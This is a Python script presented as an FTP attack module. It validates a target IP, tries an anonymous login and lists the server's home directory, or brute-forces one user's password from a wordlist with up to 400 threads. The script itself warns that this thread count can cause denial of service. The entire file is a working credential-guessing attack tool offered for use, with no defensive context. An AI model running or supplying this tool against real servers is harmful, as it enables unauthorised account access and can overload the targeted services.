#!/usr/bin/python3


import ftplib
import re
import sys, time, os
from multiprocessing.dummy import Pool as ThreadPool
import itertools

validIP = re.compile('^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
line = '------------------------------------'
i = 0

start = ''

def Start0():
	print("Welcome to the FTP Anonymous login/Brute Force Module")
	print("Target Host IP required")
	print("Target Host IP List, Password List are Optional")
	print("--------------------------------------------------------")
	print("Option 1: Anonymous Login")
	print("Option 2: Brute Force")
	Start1()

def Start1():
	ftpTarget = input("Target Host: ")
	if validIP.match(ftpTarget):
		ftpCheck(ftpTarget)
		Start2(ftpTarget)
	else:
		print('Please enter a valid IP')
		Start1()

def Start2(ftpTarget):
	answeR = input('Select an Option. [1]: ')
	if(answeR == '' or answeR == '1'):
		ftpAnon(ftpTarget)
	elif(answeR == '2'):
		ftpinitBF(ftpTarget)

def ftpCheck(ftpTarget):
	ftp = ftplib.FTP(ftpTarget)
	try:
		ftp.connect()
		return()
	except Exception as E:
		print('Target Host down or FTP is being filtered by Firewall')
		Start1()

def ftpAnon(ftpTarget):
	ftp = ftplib.FTP(ftpTarget)	
	try:
		ftp.login()
		print('Anonymous Login Successful! :D')
		print(line)
		print('--------HOME DIRECTORY LIST---------')
		print(line)
		ftp.retrlines('LIST')
		ftp.quit()
	except Exception as E:
		print('Anonymous Login Unsuccessful :(')

def ftpinitBF(ftpTarget):
	ftpuName = input('Enter username to BF: ')
	ftppwFile = input("Password List File: ")
	if (os.path.isfile (ftppwFile)):
		answeR = input(('Username: %s - List: %s Loaded. Confirm [Y/n]: ' % (ftpuName, ftppwFile)))
		if(answeR == '' or answeR == 'y'):
			ftptCount(ftpTarget, ftpuName, ftppwFile)
		elif(answeR == 'n'):
			ftpinitBF(ftpTarget)
	else:
		print('Please enter a valid file')
		ftpinitBF(ftpTarget)
		
def ftptCount(ftpTarget, ftpuName, ftppwFile):
	tCount = int(input('How many threads? 400 MAX - Can cause DOS: '))
	if tCount in range(1,401):
		answeR = input(('%s Threads Selected. Continue? [Y/n]:' % (tCount)))
		if(answeR == '' or answeR == 'y'):
			ftpBF1(ftpTarget, ftpuName, ftppwFile, tCount)
		elif(answeR == 'n'):
			ftptCount(ftpTarget, ftpuName, ftppwFile)
		else:
			print('Invalid Selection')
			ftptCount(ftpTarget, ftpuName, ftppwFile)
	else:
		print('Invalid Selection')
		ftptCount(ftpTarget, ftpuName, ftppwFile)
					
def ftpBF1(ftpTarget, ftpuName, ftppwFile, tCount):
	global start
	pooL = ThreadPool(tCount)
	total = sum(1 for line in open(ftppwFile))
	passworD = []
	awshet = [ftpTarget, ftpuName, total]
	with open(ftppwFile) as pwList:
		for pW in pwList:
			passworD.append(pW)
	start = time.time()
	progress(i,total)
	pooL.map( ftpBF2, zip(passworD, itertools.repeat(awshet)))
	print('')
	pooL.close()
	pooL.join()

def ftpBF2(cB):
	global i
	pD = cB[0].strip()
	cheA = cB[1]
	tG, uNa, tT = cheA
	uN = uNa.strip()
	time.sleep(.01)	
	try:
		ftp = ftplib.FTP(tG)
		ftp.login(uN, pD)
		print(('\nUsername %s - PW - %s Successful' % (uN, pD)))
		end = time.time()
		print(end - start)
		os._exit(0)
	except Exception as E:
		i = i + 1
		progress(i,tT)
		pass
	
		
def progress(count, total):
	bar_len = 38
	filled_len = int(round(bar_len * count / float(total)))
	percents = round(100.0 * count / float(total), 1)
	bar = '#' * filled_len + '=' * (bar_len - filled_len)
	space = '{message: <0}'.format(message='')
	sys.stdout.write('%s/%s || %s [%s] %s%s Exhausted\r' % (i, total, space, bar, percents, '%'))
	sys.stdout.flush()

if __name__ == '__main__':
	try:
		Start0()
	except Exception as E:
		print(E)
	except KeyboardInterrupt:
		print('-----------------------------------------------------')
		print("\nUser Interrupt. Exiting FTP Brute Force Attack Module")
		print('-----------------------------------------------------')
		
		

#	try:
#		ftp.connect()
#	except Exception as E:
#		pass  